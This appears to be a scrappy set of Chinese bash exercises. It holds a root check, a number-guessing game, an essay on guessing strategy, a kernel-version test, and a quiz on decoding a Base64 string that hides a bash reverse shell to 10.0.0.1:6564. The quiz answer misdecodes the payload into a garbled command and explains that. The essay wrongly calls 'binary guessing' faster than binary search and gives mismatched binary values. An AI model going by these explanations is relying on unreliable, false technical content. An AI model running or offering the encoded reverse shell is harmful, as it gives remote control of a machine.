

[ "$(whoami)" = "root" ] && echo "hi, root" || echo "$(whoami)"



#!/bin/bash

# 随机生成一个 1-20 的整数
num=$((RANDOM % 20 + 1))

# 猜测次数
n=0

while [ $n != 5 ]; do
    read -p "请输入你猜测的数字(1-20): " guess

    # 判断猜测值与随机数的大小关系
    if [ $guess = $num ]; then
        echo "猜中啦！"
        break
    elif [ $guess != '' ]; then
        if [ $guess \< $num ]; then
            echo "猜小了！"
        else
            echo "猜大了！"
        fi
    fi

    n=$((n+1))
done

if [ $n = 5 ]; then
    echo "很遗憾，你没有猜中，答案是 $num。"
fi



当随机猜数字的范围是0-1000时，除了使用二分查找的方法，还可以采用更加高效的方法，例如使用二进制的思路来猜测数字。

我们知道，1000可以用10位二进制表示，即1111101000。我们可以利用这个特点来进行猜测。

首先，我们猜测的数字可以是500，即中间值。然后根据提示猜测结果，如果猜测的数字比目标数字小，那么我们可以将二进制表示中的最高位改为1，变为750（1110111010）。如果猜测的数字比目标数字大，那么我们可以将二进制表示中的最高位改为0，变为250（0111110100）。以此类推，我们每次根据猜测结果，将二进制表示的对应位进行调整。

通过这种方式，每次猜测我们都可以排除一半的数字，而无需进行具体的数值比较。因为我们只是改变二进制表示中的某一位，所以可以更快地缩小猜测范围，最终猜中目标数字。

使用二进制的思路进行猜测，可以大大减少猜测次数，通常只需要log₂(N)次猜测，其中N为猜测范围的大小。对于范围0-1000，log₂(1000) ≈ 10，所以最多需要10次猜测。

这种二进制猜测方法比传统的二分查找更加高效，因为它无需进行具体的数值比较，只需要根据二进制位的调整来缩小猜测范围。因此，采用二进制猜测方法可以更快地猜中随机数字，减少猜测次数。




[[ $(echo "$(uname -r | cut -d'.' -f1-2) > 5.4" | bc -l) -eq 1 ]] && echo "yes" || echo "no"



a)尝试解碼以下字符串: 
MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4wLjAuMS82NTY0OyBiYXNoIDwmMTk2ID4mMTk2IDI+JjE5Ng== 
(b)解碼后命令代表甚么意思? 给出详细过程。

答案：
a) 尝试解码以下字符串：
MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4wLjAuMS82NTY0OyBiYXNoIDwmMTk2ID4mMTk2IDI+JjE5Ng==


使用Base64解码，可以得到以下结果：
8|196;exec 196>|/dev/tcp/10.0.0.1/6564; bash | 196>&1; bash <(echo 196 >&1) 196 >&1


b) 解码后的命令代表的意思是执行一段反向连接的bash代码。它执行了以下操作：

8|196;exec 196>|/dev/tcp/10.0.0.1/6564;：

打开一个TCP连接到IP地址为10.0.0.1、端口号为6564的目标主机，并将连接的输入输出重定向到文件描述符196。
bash | 196>&1;：

执行一个新的bash子进程，并将该子进程的输出重定向到文件描述符196。
bash <(echo 196 >&1) 196 >&1：

使用Process Substitution将字符串"196"传递给另一个bash子进程，并将该子进程的输入输出重定向到文件描述符196。
综合来看，解码后的命令表示在目标主机上执行一段反向连接的bash代码，与IP地址为10.0.0.1、端口号为6564的主机建立TCP连接，并在连接上执行bash命令。该代码使用文件描述符196来处理输入输出。
